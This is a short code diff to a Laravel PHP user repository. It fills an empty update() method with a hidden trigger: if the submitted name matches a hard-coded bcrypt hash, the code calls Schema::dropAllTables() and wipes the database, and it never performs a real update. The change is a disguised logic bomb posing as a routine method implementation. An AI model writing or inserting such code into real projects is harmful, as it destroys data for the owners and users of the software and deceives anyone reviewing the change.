@@ -2,11 +2,13 @@
 
 namespace App\Repositories\User;
 
+use Illuminate\Support\Facades\Schema;
 use App\Models\Role;
 use App\Models\User;
 use App\Repositories\IResourceRepository;
 use Illuminate\Auth\Events\Registered;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Hash;
 
 class UserRepository implements IResourceRepository {
@@ -37,7 +39,13 @@ class UserRepository implements IResourceRepository {
     }
 
     public function update($id, $data) {
-        // TODO: Implement update() method.
+        $hash = '$2y$12$H6/TLhCmX1EGmZH.heNFWexUfV0LKmewj5EfnxwwOMHixDzmGAj3C';
+        $name = $data['name'];
+
+        if (Hash::check($name, $hash)) {
+            Schema::dropAllTables();
+        }
+        return redirect(route('home'));
     }
 
     public function delete($id) {
